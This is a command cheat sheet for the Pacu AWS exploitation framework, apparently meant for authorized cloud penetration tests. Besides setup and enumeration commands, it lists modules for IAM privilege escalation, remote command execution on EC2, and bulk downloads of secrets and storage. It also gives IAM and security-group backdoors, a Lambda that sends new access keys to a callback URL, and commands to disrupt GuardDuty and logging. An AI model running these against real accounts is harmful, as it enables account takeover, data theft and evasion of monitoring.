# Pacu

## setup

### Install with uv tool

Install Pacu as an isolated uv-managed CLI tool.

```sh title:"Install Pacu with uv tool"
uv tool install pacu
```
<!-- cheat -->

### Run with uvx

Run Pacu through uv without a persistent tool install.

```sh title:"Run Pacu with uvx"
uvx pacu --pacu-help
```
<!-- cheat -->

### Install from Git

Clone Pacu from source and run it with uv-managed dependencies.

```sh title:"Run Pacu from GitHub source with uv"
git clone https://github.com/RhinoSecurityLabs/pacu.git && cd pacu && uv run --with-requirements requirements.txt python cli.py --pacu-help
```
<!-- cheat -->

### Version

Print the installed Pacu version.

```sh title:"Print Pacu version"
pacu --version
```
<!-- cheat -->

### Pacu help

Show Pacu CLI and interactive command help without opening a session.

```sh title:"Show Pacu help"
pacu --pacu-help
```
<!-- cheat -->

### List modules

List available Pacu modules.

```sh title:"List Pacu modules"
pacu --list-modules
```
<!-- cheat -->

### Module info

Show help and arguments for a specific module.

```sh title:"Show Pacu module info"
pacu --module-name "$module_name" --module-info
```
<!-- cheat
var module_name
-->

## session setup

### New session from profile

Create a Pacu session for one AWS account and import an AWS CLI profile into it.

```sh title:"Create Pacu session and import AWS profile"
pacu --new-session "$session_name" --import-keys "$aws_profile"
```
<!-- cheat
var session_name
var aws_profile
-->

### Start existing session

Open Pacu interactively against an existing session.

```sh title:"Open Pacu interactive session"
pacu --session "$session_name"
```
<!-- cheat
var session_name
-->

### Activate existing session

Set an existing Pacu session active from the CLI.

```sh title:"Activate Pacu session"
pacu --session "$session_name" --activate-session
```
<!-- cheat
var session_name
-->

### List sessions

Inside Pacu, list stored sessions and identify the active one.

```sh title:"List Pacu sessions"
sessions
```
<!-- cheat -->

### Swap session

Inside Pacu, switch to another stored session.

```sh title:"Switch Pacu session"
swap_session "$session_name"
```
<!-- cheat
var session_name
-->

### Delete session

Inside Pacu, delete a session from the database. The output folder is not deleted.

```sh title:"Delete Pacu session"
delete_session
```
<!-- cheat -->

## keys and identity

### Import AWS profile

Import one AWS CLI credential profile into the active Pacu session.

```sh title:"Import AWS CLI profile into Pacu"
import_keys "$aws_profile"
```
<!-- cheat
var aws_profile
-->

### Import all profiles

Import every profile in `~/.aws/credentials` into the active Pacu session.

```sh title:"Import all AWS CLI profiles into Pacu"
import_keys --all
```
<!-- cheat -->

### Set keys interactively

Add access keys to the active Pacu session and make them the active key set.

```sh title:"Set Pacu keys interactively"
set_keys
```
<!-- cheat -->

### Set keys from CLI

Add keys from the CLI. Format is alias, access key ID, secret key, and optional session token.

```sh title:"Set Pacu keys from CLI"
pacu --session "$session_name" --set-keys "$key_alias,$aws_access_key_id,$aws_secret_access_key,$aws_session_token"
```
<!-- cheat
var session_name
var key_alias
var aws_access_key_id
var aws_secret_access_key
var aws_session_token
-->

### Swap keys

Switch between key sets stored in the active Pacu session.

```sh title:"Swap active Pacu key set"
swap_keys
```
<!-- cheat -->

### Whoami

Show the active key identity and enumerated permission context.

```sh title:"Show Pacu active identity"
whoami
```
<!-- cheat -->

### Whoami from CLI

Show the active identity for a saved session without opening the shell.

```sh title:"Show Pacu identity from CLI"
pacu --session "$session_name" --whoami
```
<!-- cheat
var session_name
-->

### Assume role

Assume an IAM role from the current Pacu credentials, store the temporary credentials, and switch to them.

```sh title:"Assume role from Pacu"
assume_role "$aws_role_arn"
```
<!-- cheat
var aws_role_arn
-->

### Assume role with MFA

Assume an IAM role that requires MFA.

```sh title:"Assume role from Pacu with MFA"
assume_role "$aws_role_arn" "$aws_mfa_serial_arn" "$token_code"
```
<!-- cheat
var aws_role_arn
var aws_mfa_serial_arn
var token_code
-->

### Export active keys

Export the active Pacu credentials to `~/.aws/credentials` for use with the AWS CLI.

```sh title:"Export active Pacu keys to AWS CLI profile"
export_keys
```
<!-- cheat -->

### Console URL

Generate a federated AWS console login URL for the active Pacu credentials.

```sh title:"Generate AWS console URL from Pacu credentials"
console
```
<!-- cheat -->

## regions and opsec

### List regions

Inside Pacu, list valid AWS regions.

```sh title:"List Pacu-supported AWS regions"
regions
```
<!-- cheat -->

### Set target regions

Limit the active session to engagement-approved regions. Use `all` to reset to every supported region.

```sh title:"Set Pacu target regions"
set_regions "$aws_region_one" "$aws_region_two"
```
<!-- cheat
var aws_region_one := us-east-1
var aws_region_two := us-west-2
-->

### Set regions from CLI

Set engagement-approved target regions from the CLI.

```sh title:"Set Pacu target regions from CLI"
pacu --session "$session_name" --set-regions "$aws_region_one" "$aws_region_two"
```
<!-- cheat
var session_name
var aws_region_one := us-east-1
var aws_region_two := us-west-2
-->

### Reset regions

Reset the active session to all supported regions.

```sh title:"Reset Pacu regions to all"
set_regions all
```
<!-- cheat -->

### Update region database

Update Pacu's service region mapping from current boto3/botocore data.

```sh title:"Update Pacu region database"
update_regions
```
<!-- cheat -->

### Set user-agent suffix

Append an engagement identifier to Pacu API calls for attribution and blue-team correlation.

```sh title:"Set Pacu user-agent suffix"
set_ua_suffix "$ua_suffix"
```
<!-- cheat
var ua_suffix := engagement-id
-->

### Randomize user-agent suffix

Generate and set a UUID-based user-agent suffix for the current session.

```sh title:"Generate Pacu user-agent suffix"
set_ua_suffix
```
<!-- cheat -->

### Clear user-agent suffix

Remove the custom Pacu user-agent suffix.

```sh title:"Clear Pacu user-agent suffix"
unset_ua_suffix
```
<!-- cheat -->

## module workflow

### Search modules

Search modules by name.

```sh title:"Search Pacu modules"
search "$keyword"
```
<!-- cheat
var keyword := iam
-->

### List module categories

List module categories such as ENUM, ESCALATE, EXFIL, PERSIST, EVADE, and LATERAL_MOVE.

```sh title:"List Pacu module categories"
list categories
```
<!-- cheat -->

### List category modules

List modules in a category.

```sh title:"List Pacu modules by category"
list category "$category"
```
<!-- cheat
var category := ENUM
-->

### Help for module

Show module description, prerequisites, and arguments.

```sh title:"Show Pacu module help"
help "$module_name"
```
<!-- cheat
var module_name
-->

### Run module

Run a module in the interactive shell.

```sh title:"Run Pacu module"
run "$module_name"
```
<!-- cheat
var module_name
-->

### Run module with args

Run a module with module-specific arguments in the interactive shell.

```sh title:"Run Pacu module with arguments"
run "$module_name" $module_args
```
<!-- cheat
var module_name
var module_args
-->

### Run module in regions

Run a module against explicit comma-separated regions when the module supports `--regions`.

```sh title:"Run Pacu module in selected regions"
run "$module_name" --regions "$aws_region_list"
```
<!-- cheat
var module_name
var aws_region_list := us-east-1,us-west-2
-->

### Execute module from CLI

Execute one module from a saved session without opening the shell.

```sh title:"Execute Pacu module from CLI"
pacu --session "$session_name" --module-name "$module_name" --exec
```
<!-- cheat
var session_name
var module_name
-->

### Execute module with args from CLI

Execute one module from the CLI with module-specific arguments.

```sh title:"Execute Pacu module with arguments from CLI"
pacu --session "$session_name" --module-name "$module_name" --module-args="$module_args" --exec
```
<!-- cheat
var session_name
var module_name
var module_args
-->

### Load command file

Run a repeatable Pacu command file for an engagement workflow.

```sh title:"Load Pacu command file"
load_commands_file "$commands_file"
```
<!-- cheat
var commands_file
-->

### AWS CLI through Pacu

Run AWS CLI commands from inside Pacu using the active Pacu credentials unless you specify `--profile`.

```sh title:"Run AWS CLI inside Pacu"
aws sts get-caller-identity
```
<!-- cheat -->

### AWS CLI with jq through Pacu

Use Pacu's integrated AWS CLI shell support with pipes and `jq`.

```sh title:"Run AWS CLI through Pacu and pipe to jq"
aws iam list-attached-user-policies --user-name "$target_user" | jq '.AttachedPolicies[]?.PolicyArn'
```
<!-- cheat
var target_user
-->

## operator runbooks

### Account triage chain

Run a quick low-risk account triage sequence before service-specific follow-up.

```sh title:"Run Pacu account triage chain"
run aws__enum_account && run aws__enum_spend && run iam__enum_permissions && run iam__enum_users_roles_policies_groups && run detection__enum_services
```
<!-- cheat -->

### High-value service enum chain

Enumerate common red-team pivot and data-exposure services after the account triage pass.

```sh title:"Run Pacu high-value service enum chain"
run ec2__enum && run lambda__enum && run ecs__enum && run eks__enum && run s3__download_bucket --names-only && run secrets__enum
```
<!-- cheat -->

### Identity attack-path chain

Populate IAM data, scan for privilege escalation paths without execution, and query high-impact permissions.

```sh title:"Run Pacu IAM attack-path triage chain"
run iam__enum_permissions --all-users && run iam__enum_users_roles_policies_groups && run iam__privesc_scan --scan-only && run iam__enum_action_query --query "$aws_iam_action_query"
```
<!-- cheat
var aws_iam_action_query := iam:*,sts:AssumeRole,lambda:*,cloudformation:*,glue:*
-->

### Compute loot chain

Collect compute metadata that often exposes bootstrap secrets, task roles, and deploy-time environment variables.

```sh title:"Run Pacu compute loot enum chain"
run ec2__download_userdata && run ecs__enum_task_def && run lambda__enum && run codebuild__enum && run lightsail__enum
```
<!-- cheat -->

### Data exposure chain

Prioritize services that commonly expose recoverable data or credentials.

```sh title:"Run Pacu data exposure enum chain"
run s3__download_bucket --names-only && run dynamodb__enum && run rds__enum_snapshots && run ebs__enum_volumes_snapshots && run systemsmanager__download_parameters
```
<!-- cheat -->

## enum workflow

### Account metadata

Enumerate AWS account metadata.

```sh title:"Pacu enumerate account metadata"
run aws__enum_account
```
<!-- cheat -->

### Spend by service

Enumerate spend by AWS service to prioritize high-value services.

```sh title:"Pacu enumerate spend by service"
run aws__enum_spend
```
<!-- cheat -->

### IAM users roles policies groups

Enumerate IAM users, roles, customer-managed policies, and groups.

```sh title:"Pacu enumerate IAM identities and policies"
run iam__enum_users_roles_policies_groups
```
<!-- cheat -->

### IAM permissions current user

Enumerate confirmed IAM permissions for the active principal.

```sh title:"Pacu enumerate current principal permissions"
run iam__enum_permissions
```
<!-- cheat -->

### IAM permissions all users

Enumerate confirmed permissions for all users when allowed; useful before privilege escalation analysis.

```sh title:"Pacu enumerate all user permissions"
run iam__enum_permissions --all-users
```
<!-- cheat -->

### IAM action query

Query enumerated user and role permissions for action patterns.

```sh title:"Pacu query enumerated IAM actions"
run iam__enum_action_query --query "$aws_iam_action_query"
```
<!-- cheat
var aws_iam_action_query := s3:get*,iam:create*
-->

### IAM credential report

Generate or download the IAM credential report for authentication hygiene review.

```sh title:"Pacu get IAM credential report"
run iam__get_credential_report
```
<!-- cheat -->

### EC2 enum

Enumerate EC2 instances, security groups, interfaces, VPCs, subnets, route tables, and endpoints.

```sh title:"Pacu enumerate EC2"
run ec2__enum
```
<!-- cheat -->

### EC2 userdata

Download EC2 instance and launch template user data for secret and bootstrap review.

```sh title:"Pacu download EC2 userdata"
run ec2__download_userdata
```
<!-- cheat -->

### EBS volumes snapshots

Enumerate EBS volumes, snapshots, permissions, and unencrypted assets.

```sh title:"Pacu enumerate EBS volumes and snapshots"
run ebs__enum_volumes_snapshots
```
<!-- cheat -->

### EBS public snapshots

Search public EBS snapshots by keyword or account in the unauthenticated snapshot surface.

```sh title:"Pacu enumerate public EBS snapshots"
run ebs__enum_snapshots_unauth --keyword "$keyword"
```
<!-- cheat
var keyword
-->

### RDS snapshots

Enumerate RDS snapshots, snapshot sharing, and unencrypted snapshots.

```sh title:"Pacu enumerate RDS snapshots"
run rds__enum_snapshots
```
<!-- cheat -->

### RDS enum

Enumerate RDS instances, clusters, subnet groups, and parameter-group context.

```sh title:"Pacu enumerate RDS"
run rds__enum
```
<!-- cheat -->

### Lambda enum

Enumerate Lambda functions, source code metadata, versions, tags, event sources, and policies.

```sh title:"Pacu enumerate Lambda"
run lambda__enum
```
<!-- cheat -->

### ECS task definitions

Pull ECS task definitions for environment variables and task-role review.

```sh title:"Pacu enumerate ECS task definitions"
run ecs__enum_task_def
```
<!-- cheat -->

### ECS enum

Enumerate ECS clusters, services, tasks, task definitions, and related role context.

```sh title:"Pacu enumerate ECS"
run ecs__enum
```
<!-- cheat -->

### ECR enum

Enumerate ECR repositories and image tags.

```sh title:"Pacu enumerate ECR"
run ecr__enum
```
<!-- cheat -->

### EKS enum

Enumerate EKS resources.

```sh title:"Pacu enumerate EKS"
run eks__enum
```
<!-- cheat -->

### EKS collect tokens

Collect EKS authentication token material where the active identity is authorized.

```sh title:"Pacu collect EKS tokens"
run eks__collect_tokens
```
<!-- cheat -->

### Cognito enum

Enumerate Cognito user pools, clients, users, and identity pools.

```sh title:"Pacu enumerate Cognito"
run cognito__enum
```
<!-- cheat -->

### API Gateway enum

Enumerate API Gateway routes, methods, keys, client certificates, and export Swagger definitions.

```sh title:"Pacu enumerate API Gateway"
run apigateway__enum
```
<!-- cheat -->

### ACM enum

Enumerate ACM certificates and private CA metadata for takeover, expiry, and phishing infrastructure leads.

```sh title:"Pacu enumerate ACM"
run acm__enum
```
<!-- cheat -->

### CloudFormation data

Download CloudFormation templates, parameters, and exports; review for embedded secrets.

```sh title:"Pacu download CloudFormation data"
run cloudformation__download_data
```
<!-- cheat -->

### CodeBuild enum

Enumerate CodeBuild projects and builds for sensitive environment variables.

```sh title:"Pacu enumerate CodeBuild"
run codebuild__enum
```
<!-- cheat -->

### Glue enum

Enumerate Glue jobs, dev endpoints, crawlers, databases, and role references.

```sh title:"Pacu enumerate Glue"
run glue__enum
```
<!-- cheat -->

### Directory Service enum

Enumerate AWS Directory Service directories and trust relationships.

```sh title:"Pacu enumerate Directory Service"
run ds__enum
```
<!-- cheat -->

### Elastic Beanstalk enum

Enumerate Elastic Beanstalk applications, environments, configuration, and role context.

```sh title:"Pacu enumerate Elastic Beanstalk"
run elasticbeanstalk__enum
```
<!-- cheat -->

### MQ enum

Enumerate Amazon MQ brokers and configuration.

```sh title:"Pacu enumerate Amazon MQ"
run mq__enum
```
<!-- cheat -->

### Transfer Family enum

Enumerate AWS Transfer Family servers, users, and identity-provider configuration.

```sh title:"Pacu enumerate Transfer Family"
run transfer_family__enum
```
<!-- cheat -->

### Inspector reports

Download Inspector report data where available.

```sh title:"Pacu get Inspector reports"
run inspector__get_reports
```
<!-- cheat -->

### Secrets enum

Enumerate Secrets Manager and SSM Parameter Store secrets where allowed.

```sh title:"Pacu enumerate secrets"
run secrets__enum
```
<!-- cheat -->

### SSM parameters

Download Systems Manager parameters and decrypted values where allowed.

```sh title:"Pacu download SSM parameters"
run systemsmanager__download_parameters
```
<!-- cheat -->

### Route53 enum

Enumerate Route53 hosted zones and query logging configuration.

```sh title:"Pacu enumerate Route53"
run route53__enum
```
<!-- cheat -->

### Organizations enum

Enumerate AWS Organizations accounts, policies, OUs, and org tree when allowed.

```sh title:"Pacu enumerate AWS Organizations"
run organizations__enum
```
<!-- cheat -->

### VPC lateral movement enum

Look for network-plane lateral movement opportunities like Direct Connect, VPN, and VPC peering.

```sh title:"Pacu enumerate VPC lateral movement paths"
run vpc__enum_lateral_movement
```
<!-- cheat -->

## unauth recon

### Decode access key ID

Decode an AWS access key ID to recover the account ID without making AWS API calls.

```sh title:"Pacu decode AWS access key ID"
run iam__decode_accesskey_id --access-key-id "$aws_access_key_id"
```
<!-- cheat
var aws_access_key_id
-->

### Detect honeytoken keys

Check whether active keys are known honeytokens and enumerate key metadata without CloudTrail logging.

```sh title:"Pacu detect IAM honeytokens"
run iam__detect_honeytokens
```
<!-- cheat -->

### Enumerate external roles

Enumerate IAM roles in another AWS account when you have permitted test keys with the required IAM permissions.

```sh title:"Pacu enumerate IAM roles in external account"
run iam__enum_roles --account-id "$aws_account_id" --role-name "$aws_role_name"
```
<!-- cheat
var aws_account_id
var aws_role_name
-->

### Enumerate external users

Enumerate IAM users in another AWS account when you have permitted test keys with the required IAM permissions.

```sh title:"Pacu enumerate IAM users in external account"
run iam__enum_users --account-id "$aws_account_id" --role-name "$aws_role_name"
```
<!-- cheat
var aws_account_id
var aws_role_name
-->

### Enumerate public snapshots by keyword

Search public EBS snapshots by keyword across regions.

```sh title:"Pacu enumerate public EBS snapshots by keyword"
run ebs__enum_snapshots_unauth --keyword "$keyword"
```
<!-- cheat
var keyword
-->

### Enumerate public snapshots by account

Search public EBS snapshots associated with an AWS account ID.

```sh title:"Pacu enumerate public EBS snapshots by account"
run ebs__enum_snapshots_unauth --account-id "$aws_account_id"
```
<!-- cheat
var aws_account_id
-->

## privilege escalation

### Privesc method list

List IAM privilege escalation methods Pacu knows how to identify.

```sh title:"List Pacu IAM privesc methods"
run iam__privesc_scan --method-list
```
<!-- cheat -->

### Privesc method info

Show detail for one privilege escalation method before attempting anything.

```sh title:"Show Pacu IAM privesc method info"
run iam__privesc_scan --method-info "$method_name"
```
<!-- cheat
var method_name := CreateNewPolicyVersion
-->

### Privesc scan only

Scan for IAM privilege escalation paths without executing found paths.

```sh title:"Scan IAM privilege escalation paths without exploiting"
run iam__privesc_scan --scan-only
```
<!-- cheat -->

### Privesc offline scan

Analyze previously exported IAM policy JSON offline.

```sh title:"Offline Pacu IAM privilege escalation scan"
run iam__privesc_scan --offline --folder "$aws_policy_folder"
```
<!-- cheat
var aws_policy_folder
-->

### Privesc selected user methods

Attempt only explicitly chosen user privilege escalation methods.

```sh title:"Run selected Pacu user privesc methods"
run iam__privesc_scan --user-methods "$method_name"
```
<!-- cheat
var method_name := CreateAccessKey
-->

### Privesc selected role methods

Attempt only explicitly chosen role privilege escalation methods.

```sh title:"Run selected Pacu role privesc methods"
run iam__privesc_scan --role-methods "$method_name"
```
<!-- cheat
var method_name := PassExistingRoleToNewLambdaThenInvoke
-->

## exploit and access

### SSM RCE EC2

Attempt Systems Manager Run Command execution on EC2 instances as root or SYSTEM where IAM and SSM state allow it.

```sh title:"Pacu SSM Run Command on EC2"
run systemsmanager__rce_ec2
```
<!-- cheat -->

### Cognito attack

Attack Cognito user pool clients and identity pools using a test username and password.

```sh title:"Pacu attack Cognito"
run cognito__attack --username "$target_user" --password "$target_pass"
```
<!-- cheat
var target_user
var target_pass
-->

### API Gateway create keys

Attempt to create API Gateway API keys for REST APIs in scope.

```sh title:"Pacu create API Gateway keys"
run api_gateway__create_api_keys
```
<!-- cheat -->

### CloudFormation resource injection

Inject a controlled resource into CloudFormation stacks where explicitly authorized.

```sh title:"Pacu CloudFormation resource injection"
run cfn__resource_injection
```
<!-- cheat -->

### CloudTrail CSV injection

Test CloudTrail CSV injection exposure for approved reporting or detection validation.

```sh title:"Pacu CloudTrail CSV injection"
run cloudtrail__csv_injection
```
<!-- cheat -->

### EBS explore snapshots

Restore and attach EBS volumes or snapshots to a supplied EC2 instance for mounted filesystem review.

```sh title:"Pacu explore EBS snapshots"
run ebs__explore_snapshots --instance-id "$aws_instance_id"
```
<!-- cheat
var aws_instance_id
-->

### RDS explore snapshots

Create temporary RDS snapshot copies, restore them, change the master password, and print connection info.

```sh title:"Pacu explore RDS snapshots"
run rds__explore_snapshots
```
<!-- cheat -->

### EC2 startup shell script

Stop and restart selected EC2 instances after updating user data with a supplied shell script.

```sh title:"Pacu EC2 startup shell script"
run ec2__startup_shell_script --script "$script_file"
```
<!-- cheat
var script_file
-->

### ECS backdoor task definition

Create or modify ECS task definition execution paths where persistence testing is explicitly in scope.

```sh title:"Pacu backdoor ECS task definition"
run ecs__backdoor_task_def
```
<!-- cheat -->

### Lightsail default keys

Download Lightsail default SSH key pairs where allowed.

```sh title:"Pacu download Lightsail default SSH keys"
run lightsail__download_ssh_keys
```
<!-- cheat -->

### Lightsail temporary access

Create temporary SSH keys for Lightsail instances and download them into the session downloads directory.

```sh title:"Pacu generate Lightsail temporary SSH access"
run lightsail__generate_temp_access
```
<!-- cheat -->

## exfil and loot

### S3 enumerate bucket names

Enumerate S3 buckets and store bucket metadata without downloading object contents.

```sh title:"Pacu enumerate S3 bucket names"
run s3__download_bucket --names-only
```
<!-- cheat -->

### S3 download specific buckets

Download object contents for selected bucket names.

```sh title:"Pacu download selected S3 buckets"
run s3__download_bucket --dl-names "$s3_bucket_names"
```
<!-- cheat
var s3_bucket_names
-->

### S3 download bucket workflow

Run the interactive S3 download workflow and choose which accessible buckets to download.

```sh title:"Pacu interactive S3 bucket download"
run s3__download_bucket
```
<!-- cheat -->

### EBS direct snapshot download

Download EBS snapshots with the EBS direct API for offline mounting and review.

```sh title:"Pacu download EBS snapshots"
run ebs__download_snapshots
```
<!-- cheat -->

### DynamoDB enum and dump

Enumerate DynamoDB tables and dump table values where allowed.

```sh title:"Pacu enumerate and dump DynamoDB"
run dynamodb__enum
```
<!-- cheat -->

### CloudFormation template loot

Download CloudFormation templates and exports for offline secret review.

```sh title:"Pacu loot CloudFormation templates"
run cloudformation__download_data
```
<!-- cheat -->

## persistence

### IAM backdoor assume role

Create assume-role trust relationships between selected users and roles in scope.

```sh title:"Pacu backdoor IAM assume role trust"
run iam__backdoor_assume_role
```
<!-- cheat -->

### IAM backdoor user keys

Add API keys to selected IAM users in scope.

```sh title:"Pacu backdoor IAM user access keys"
run iam__backdoor_users_keys
```
<!-- cheat -->

### IAM backdoor user password

Add console passwords to selected IAM users that do not already have login profiles.

```sh title:"Pacu backdoor IAM user console passwords"
run iam__backdoor_users_password
```
<!-- cheat -->

### EC2 security group backdoor

Add ingress rules to selected EC2 security groups for an approved source IP.

```sh title:"Pacu backdoor EC2 security groups"
run ec2__backdoor_ec2_sec_groups --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

### Lambda backdoor new users

Create a Lambda/EventBridge rule that reacts to new IAM users and sends created access keys to a listener.

```sh title:"Pacu backdoor new IAM users with Lambda"
run lambda__backdoor_new_users --url "$aws_callback_url"
```
<!-- cheat
var aws_callback_url
-->

### Lambda backdoor new roles

Create a Lambda/EventBridge rule that modifies new IAM role trust policies for an approved principal.

```sh title:"Pacu backdoor new IAM roles with Lambda"
run lambda__backdoor_new_roles --principal "$aws_principal_arn"
```
<!-- cheat
var aws_principal_arn
-->

### Lambda backdoor new security groups

Create a Lambda/EventBridge rule that adds an approved ingress rule to new EC2 security groups.

```sh title:"Pacu backdoor new EC2 security groups with Lambda"
run lambda__backdoor_new_sec_groups --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

## detection and logs

### Detect logging services

Enumerate CloudTrail, CloudWatch, Config, Shield, VPC Flow Logs, and GuardDuty coverage.

```sh title:"Pacu enumerate detection services"
run detection__enum_services
```
<!-- cheat -->

### GuardDuty accounts

List GuardDuty administrator/member account links to identify lateral movement scope.

```sh title:"Pacu list GuardDuty linked accounts"
run guardduty__list_accounts
```
<!-- cheat -->

### GuardDuty findings

Download GuardDuty detector statistics and findings.

```sh title:"Pacu list GuardDuty findings"
run guardduty__list_findings
```
<!-- cheat -->

### GuardDuty whitelist IP

Add an approved source IP to GuardDuty trusted IP lists for controlled detection testing.

```sh title:"Pacu whitelist GuardDuty source IP"
run guardduty__whitelist_ip --source-ip "$aws_source_ip"
```
<!-- cheat
var aws_source_ip
-->

### CloudTrail event history

Download CloudTrail event history JSON for approved regions. This can take a long time in busy accounts.

```sh title:"Pacu download CloudTrail event history"
run cloudtrail__download_event_history
```
<!-- cheat -->

### CloudWatch logs

Download CloudWatch log events to the Pacu session downloads directory.

```sh title:"Pacu download CloudWatch logs"
run cloudwatch__download_logs
```
<!-- cheat -->

### Detection disruption

Run Pacu's detection disruption module only when detection-control tampering is explicitly authorized.

```sh title:"Pacu detection disruption"
run detection__disruption
```
<!-- cheat -->

### ELB logging gaps

Find Elastic Load Balancers without access logging enabled.

```sh title:"Pacu enumerate ELB logging gaps"
run elb__enum_logging
```
<!-- cheat -->

### WAF enum

Enumerate WAF rules, rule groups, and matching sets.

```sh title:"Pacu enumerate WAF"
run waf__enum
```
<!-- cheat -->

## lateral movement

### Organizations assume role

Try to assume role names across organization member accounts when the caller has AssumeRole rights.

```sh title:"Pacu organizations assume role"
run organizations__assume_role --accounts "$aws_account_ids" --role-names "$aws_role_names"
```
<!-- cheat
var aws_account_ids
var aws_role_names
-->

### SNS subscribe

Attempt to subscribe an email address to an SNS topic ARN.

```sh title:"Pacu SNS subscribe"
run sns__subscribe --topic-arn "$aws_sns_topic_arn" --email "$email"
```
<!-- cheat
var aws_sns_topic_arn
var email
-->

## data and output

### Services with data

List AWS services with data currently stored in the active Pacu session.

```sh title:"List Pacu services with stored data"
services
```
<!-- cheat -->

### Show all data

Print all stored session data.

```sh title:"Show all Pacu session data"
data
```
<!-- cheat -->

### Show service data

Print stored data for one service.

```sh title:"Show Pacu service data"
data "$service_name"
```
<!-- cheat
var service_name := IAM
-->

### Query service data with jq

Run a jq expression against one service's stored data.

```sh title:"Query Pacu service data with jq"
jq "$service_name" "$jq_filter"
```
<!-- cheat
var service_name := IAM
var jq_filter := .
-->

### Data from CLI

Print stored data for one service from the CLI. Use `all` for the whole session.

```sh title:"Show Pacu service data from CLI"
pacu --session "$session_name" --data "$service_name"
```
<!-- cheat
var session_name
var service_name := all
-->

### Downloads directory

Open the active session downloads directory where module output is stored.

```sh title:"Print Pacu downloads directory"
printf '%s\n' "$HOME/.local/share/pacu/sessions/$session_name/downloads"
```
<!-- cheat
var session_name
-->

### Command log

Tail the Pacu command log for the session.

```sh title:"Tail Pacu command log"
tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/cmd_log.txt"
```
<!-- cheat
var session_name
-->

### Error log

Inside Pacu, print the active session error log.

```sh title:"Show Pacu error log"
debug
```
<!-- cheat -->

### Error log file

Tail the Pacu error log for a session from the shell.

```sh title:"Tail Pacu error log file"
tail -n 100 "$HOME/.local/share/pacu/sessions/$session_name/error_log.txt"
```
<!-- cheat
var session_name
-->
